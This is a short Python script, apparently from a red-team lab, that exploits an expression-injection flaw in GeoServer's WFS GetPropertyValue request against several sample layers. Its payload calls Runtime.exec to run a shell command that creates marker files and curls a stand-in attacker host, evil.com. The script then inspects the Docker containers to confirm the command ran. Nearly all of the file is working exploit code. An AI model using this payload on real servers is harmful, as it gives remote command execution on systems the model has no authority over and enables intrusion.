# -*- coding: utf-8 -*-
"""RT-4 GeoServer GS-1b: 36401-style eval on EPSG:4326 layers (EPSG db broken by profile side-effect)."""
import subprocess

import requests
import urllib3

urllib3.disable_warnings()

BASE = "http://127.0.0.1:18082"
s = requests.Session()
s.trust_env = False
s.verify = False

XPATH = ("exec(java.lang.Runtime.getRuntime(),"
         "new java.lang.String[]{'/bin/sh','-c',"
         "'touch /tmp/start_rt4_gs_a1; touch /tmp/hsperfdata_root/pwn_rt4_gs_a2; "
         "curl -m 5 -s http://evil.com:8000/rt/rt4_gs_a3'})")

for tn in ("topp:states", "topp:tasmania_cities", "sf:bugsites", "tiger:giant_polygon"):
    r = s.get(BASE + "/geoserver/ows", params={
        "service": "WFS", "version": "2.0.0", "request": "GetPropertyValue",
        "typeNames": tn, "valueReference": XPATH,
    }, timeout=60)
    txt = r.text.replace("\n", " ")
    if len(txt) > 300:
        txt = txt[:150] + "...[" + str(len(txt)) + "B]..." + txt[-150:]
    print("[*] %-24s HTTP %s | %s" % (tn, r.status_code, txt[:400]))

print("\n=== truth ===")
for p in ("/tmp", "/tmp/hsperfdata_root"):
    r = subprocess.run(["docker", "exec", "multi-round-lab-geoserver-1", "ls", "-l", "--full-time", p],
                       capture_output=True, text=True)
    print(r.stdout + r.stderr)
r = subprocess.run(["docker", "logs", "multi-round-lab-infra-1", "--since", "3m"],
                   capture_output=True, text=True)
for line in (r.stdout + r.stderr).splitlines():
    if "rt4" in line:
        print("[infra] " + line)
